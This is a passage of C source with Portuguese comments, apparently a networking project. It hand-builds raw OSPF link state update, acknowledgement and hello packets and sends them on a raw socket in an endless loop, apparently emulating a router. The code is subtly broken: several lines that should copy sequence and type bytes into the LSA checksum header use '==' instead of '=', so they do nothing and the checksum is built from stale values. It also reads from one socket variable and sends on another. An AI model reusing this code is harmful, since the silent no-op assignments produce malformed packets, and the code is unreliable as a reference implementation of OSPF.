	begin= time(NULL);   
	while(difftime(time(NULL), begin) < 2 ){}

	//envia o link state update
	if((retValue = sendto(sockFd, bufferLinkStateUpdate, 98, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
	    printf("ERROR! sendto() \n");
	    exit(1);
	}  
	printf("%s\n", "enviei bufferLinkStateUpdate de ROUTER");

    //envia pacotes de hello pra sempre e responde LSUPDATES 
    begin= time(NULL);   
    while(1){
    	recv(sockd,(char *) &buff1, sizeof(buff1), 0x0);
    	//verifica se é um update em broadcast para então responder
    	if (buff1[0] == localMac[0] && buff1[1] == localMac[1] && buff1[2] == localMac[2] && // meu MAC
	            	 buff1[3] == localMac[3] && buff1[4] == localMac[4] && buff1[5] == localMac[5] 
	           		 && buff1[35] == 0x04)
		{	
			//seta o tipo do ls no ospf
			bufferLinkStateACK[61] = buff1[65];
			//seta sequence no ospf
			bufferLinkStateACK[70] = buff1[74];
			bufferLinkStateACK[71] = buff1[75];
			bufferLinkStateACK[72] = buff1[76];
			bufferLinkStateACK[73] = buff1[77];

			//setou as informações no checksum do OSṔF
			OSPFCabecalhoLinkStateACKCheckSum[12] = 0x00;
			OSPFCabecalhoLinkStateACKCheckSum[13] = 0x00;
			OSPFCabecalhoLinkStateACKCheckSum[17] = buff1[65];

			OSPFCabecalhoLinkStateACKCheckSum[26] = buff1[74];
			OSPFCabecalhoLinkStateACKCheckSum[27] = buff1[75];
			OSPFCabecalhoLinkStateACKCheckSum[28] = buff1[76];
			OSPFCabecalhoLinkStateACKCheckSum[29] = buff1[77];

			//setou as informações no checksum do LSA
			LSAHeaderACKCheckSum[14] = 0x00;
			LSAHeaderACKCheckSum[15] = 0x00;
			LSAHeaderACKCheckSum[1] == buff1[65];

			LSAHeaderACKCheckSum[10] == buff1[74];
			LSAHeaderACKCheckSum[11] == buff1[75];
			LSAHeaderACKCheckSum[12] == buff1[76];
			LSAHeaderACKCheckSum[13] == buff1[77];

    		//calcula checksum do lsa
    		teste = CheckSumFletcher(LSAHeaderACKCheckSum,18);
       		bufferLinkStateACK[74] = (teste >> (8*1)) & 0xFF; 
    		bufferLinkStateACK[75] = (teste >> (8*0)) & 0xFF; 

    		//adiciona checksum do fletcher
    		OSPFCabecalhoLinkStateACKCheckSum[30] = bufferLinkStateACK[74];
    		OSPFCabecalhoLinkStateACKCheckSum[31] = bufferLinkStateACK[75];

			//calcula checksum do ospf
			checksumOSPF = CheckSum(&OSPFCabecalhoLinkStateACKCheckSum, 34);

		    bufferLinkStateACK[46] = (checksumOSPF >> (8*0)) & 0xFF; 
		    bufferLinkStateACK[47] = (checksumOSPF >> (8*1)) & 0xFF; 

			if((retValue = sendto(sockFd, bufferLinkStateACK, 78, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
			    printf("ERROR! sendto() \n");
			    exit(1);
			}  
			printf("%s\n", "enviei buffer ack" );

	    }
       	else if(difftime(time(NULL), begin) > 5){
            if((retValue = sendto(sockFd, bufferHello, 82, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
                printf("ERROR! sendto() \n");
                exit(1);
            }
            begin= time(NULL);   
        }
    }    

}